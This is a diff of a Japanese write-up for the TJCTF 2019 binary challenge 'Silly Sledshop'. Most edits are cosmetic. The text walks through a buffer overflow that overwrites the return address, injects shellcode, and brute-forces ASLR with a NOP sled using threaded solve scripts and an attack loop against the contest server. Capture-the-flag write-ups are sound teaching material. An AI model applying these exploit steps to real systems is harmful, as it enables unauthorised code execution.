@@ -1,13 +1,15 @@
-# 問題
+# TJCTF 2019 `Silly Sledshop [bin 80]` writeup
+
+## 問題
 
 ![問題](./001.png)
 
 binというよりpwn系の問題。
-バイナリがソースコード付きで配布されていて、サーバでそのバイナリのサービスが後悔されている。
+バイナリがソースコード付きで配布されていて、サーバでそのバイナリのサービスが公開されている。
 
-# 解法
+## 解法
 
-## 簡単な調査
+### 簡単な調査
 
 まずはバイナリをチェック。
 CanaryもないしPIEも無いしゆるゆるじゃん！と最初は思った。
@@ -73,17 +75,17 @@ $
 
 と立てた。
 
-## IPの取得
+### IPの取得
 
 
 まずはgdbで追いながらスタック上の戻り番地を特定。
 1. gdbでrunして
 2. 文字列コピペして
-3. segmentationfaul起こさせて
+3. segmentation fault起こさせて
 4. $eipに入ってる値からproduct_nameの81～84番目で行けそうなことが判明。
 
 ```bash-statement
-saru@lucifen:~/wani-writeup/2019/04-tjctf/bin-silly-sledshop$ gdb ./sledshop
+$ gdb ./sledshop
 GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
 Copyright (C) 2018 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@@ -118,7 +120,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 ![gdb](./002.jpg)
 
-`objdump -d -M intel ./sledshop shop_list`を実行して`shop_list()`を呼んでいるアドレス「0x804862d」にリターンすることを決定。
+`objdump -d -M intel ./sledshop shop_list`を実行して`shop_list()`を呼んでいるアドレス「`0x804862d`」にリターンすることを決定。
 というのもshop_list呼ぶところに戻ればリストが二回表示されて分かりやすいから。
 
 
@@ -139,7 +141,7 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 
 
-1. オーバフロー用の文字列を吐き出す`make_string.py`を作成
+1. オーバフロー用の文字列を吐き出す`make_string001.py`を作成
 2. `make_string001.py`の実行結果をexploit001.txtに出力
 3. `cat exploit001.txt | ./sledshop` を実行
 
@@ -176,12 +178,12 @@ Segmentation fault (core dumped)
 $
 ```
 
-## シェルコードの送り込み&実行
+### シェルコードの送り込み&実行
 
 今度はシェルコードを送り込む。
 まずは動作結果が分かりやすいlsが実行できるシェルコードを作成。
 lsの良いところはshに変えればシェルにも変わるところ。
-シェルコードを置ける位置を`0xffffd430`と確認して、攻撃用文字列を吐く`make_string002.pyを作成、gdb上で動作確認。
+シェルコードを置ける位置を`0xffffd430`と確認して、攻撃用文字列を吐く`make_string002.py`を作成、gdb上で動作確認。
 行った。
 正直ここでもうこの問題は終わったと思っていました．．．
 
@@ -204,7 +206,7 @@ $ python make_string002.py > exploit002.txt
 ```
 
 ```bash-statement
-gef$  run < wu_exploit002.txt
+gef➤ run < wu_exploit002.txt
 Starting program: /home/saru/wani-writeup/2019/04-tjctf/bin-silly-sledshop/sledshop < wu_exploit002.txt
 The following products are available:
 |  Saucer  | $1 |
@@ -220,13 +222,13 @@ a.out
 attack.sh
 exploit001.txt
 [Inferior 1 (process 29638) exited normally]
-gef$
+gef➤  
 ```
 
-## ASLRとの戦い
+### ASLRとの戦い
 
-まずは動いたコードを使ってexploitを書いてみたけどまぁこれは予想通りシェルは取れない。
-gdb上での実行と実際の実行では環境変数などへの影響でスタックに積まれているデータが変わることを知っていたのでこれはまぁそうかなと納得。
+まずは動いたコードを使ってexploit「`solve001.py`」を書いてみたけどまぁこれは予想通りシェルは取れない。
+gdb上での実行と実際の実行では環境変数などへの影響でスタックに積まれているデータが変わってアドレスも変わってしまうことを知っていたのでこれはまぁそうかなと納得。
 
 ```python:solve001.py
 import socket
@@ -280,7 +282,7 @@ $
 
 
 公開されているソースコードでアドレスの位置を出力するコードを追加してコンパイル。
-ローカルで実行するとproduct_nameの先頭は0xffffd48cであることが分かる。
+ローカルで実行すると`product_name`の先頭は`0xffffd48c`であることが分かる。
 
 ```
 void shop_order() {
@@ -378,7 +380,8 @@ t.interact()
 
 
 ```bash-statement
-saru@lucifen:~/wani-writeup/2019/04-tjctf/bin-silly-sledshop$ python wu_solve002.py ffffd410
+$ python solve002.py
+ffffd410
 localhost
 10000
 b'The following products are available:\n|  Saucer  | $1 |\n| Kicksled | $2 |\n| Airboard | $3 |\n| Toboggan | $4 |\n0xffffd3fc\nWhich product would you like?\n'
@@ -400,6 +403,7 @@ exit
 考えられる理由は1つしかない。
 ASLRが有効．．．
 高校生の大会じゃないのかよ．．．
+難しすぎだろ．．．
 
 NOP sledを使ったbruteforceをやるしかない。
 記事では知っていたけど、まだ実装はしたことない。
@@ -414,6 +418,7 @@ NOP sledを使ったbruteforceをやるしかない。
 $ sudo sysctl -w kernel.randomize_va_space=2
 kernel.randomize_va_space = 2
 $
+```
 
 ん．．．ということは8388607の範囲。
 広すぎるだろ．．．
@@ -423,7 +428,7 @@ $
 
 と思ったのだけどgetsがsegmentation fault起こすので最大でも1000ぐらいしか行けない。
 
-時間かけるかと考え直して1000スレッドさせるコードと1000ずつincrementするattack.shを書いた。
+時間かけるかと考え直して1000スレッドさせるsolve003.pyと1000ずつincrementするattack.shを書いた。
 
 ```python:solve003.py
 import socket
@@ -477,7 +482,7 @@ done
 
 ```bash-statement
 $ bash attack.sh
-python wu_solve003.py 4286578688
+python solve003.py 4286578688
 ff800000
 p1.tjctf.org
 8010
@@ -512,7 +517,7 @@ timeout: the monitored command dumped core
 バグがあるんじゃないかとドキドキしながらまっていたので心臓に悪い問題だった。
 
 ```bash-statement
-python solve_many.py 4291613264
+python solve003.py 4291613264
 ffccd250
 p1.tjctf.org
 8010
